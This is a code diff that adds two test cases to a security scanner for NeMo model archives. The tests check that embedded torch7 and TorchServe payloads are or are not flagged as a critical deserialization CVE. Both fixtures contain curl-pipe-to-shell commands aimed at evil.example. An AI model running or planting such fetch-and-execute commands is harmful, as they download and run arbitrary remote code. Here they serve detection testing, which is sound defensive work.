@@ -238,6 +238,24 @@ class TestNemoArchiveVulnerabilityCoverage:
         assert cve_checks[0].severity == IssueSeverity.CRITICAL
         assert cve_checks[0].details["nested_scanner"] == "torch7"
 
+    def test_marker_form_torch7_checkpoint_with_pt_suffix_detects_nemo_deserialization_cve(
+        self, tmp_path: Path
+    ) -> None:
+        nemo_path = tmp_path / "marker-torch7-checkpoint-rce.nemo"
+        torch7_payload = (
+            b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example/payload.sh | sh')\n"
+        )
+        with tarfile.open(nemo_path, "w") as tar:
+            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
+
+        result = NemoScanner().scan(str(nemo_path))
+
+        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
+        assert len(cve_checks) == 1
+        assert cve_checks[0].severity == IssueSeverity.CRITICAL
+        assert cve_checks[0].details["nested_scanner"] == "torch7"
+
     def test_symlink_checkpoint_alias_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-symlink-alias.nemo"
         with tarfile.open(nemo_path, "w") as tar:
@@ -508,6 +526,28 @@ class TestNemoArchiveVulnerabilityCoverage:
         assert result.success is True
         assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
         assert "scan_outcome" not in result.metadata
+
+    def test_metadata_referenced_torchserve_finding_is_not_deserialization_cve(self, tmp_path: Path) -> None:
+        nemo_path = tmp_path / "referenced-torchserve.nemo"
+        config = {
+            "model": {"_target_": "nemo.Model"},
+            "handler": "nemo:artifacts/handler.mar",
+        }
+        mar_payload = io.BytesIO()
+        with zipfile.ZipFile(mar_payload, "w") as archive:
+            archive.writestr(
+                "MAR-INF/MANIFEST.json",
+                '{"model":{"serializedFile":"weights.bin","handler":"handler.py"}}',
+            )
+            archive.writestr("weights.bin", b"weights")
+            archive.writestr("handler.py", b"import os\nos.system('curl https://evil.example | sh')\n")
+        with tarfile.open(nemo_path, "w") as tar:
+            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+            _add_tar_bytes(tar, "artifacts/handler.mar", mar_payload.getvalue())
+
+        result = NemoScanner().scan(str(nemo_path))
+
+        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
 
     def test_nested_checkpoint_archive_traversal_not_labeled_deserialization_cve(self, tmp_path: Path) -> None:
         nested_checkpoint = io.BytesIO()
